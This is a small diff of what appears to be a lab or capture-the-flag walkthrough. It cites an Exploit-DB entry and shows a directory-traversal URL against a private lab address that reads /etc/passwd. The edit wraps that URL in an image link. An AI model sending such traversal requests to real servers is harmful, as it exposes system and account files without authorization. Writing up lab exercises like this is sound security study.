@@ -131,8 +131,7 @@ https://www.exploit-db.com/exploits/48411
 
 Run the exploit
 
-http://192.168.22.136:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd
-
+![image](http://192.168.22.136:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd.png)
 
 ![image](https://user-images.githubusercontent.com/66864342/160244472-ad6caaa5-1ec9-4a8f-8411-53bf70e56edf.png)
 
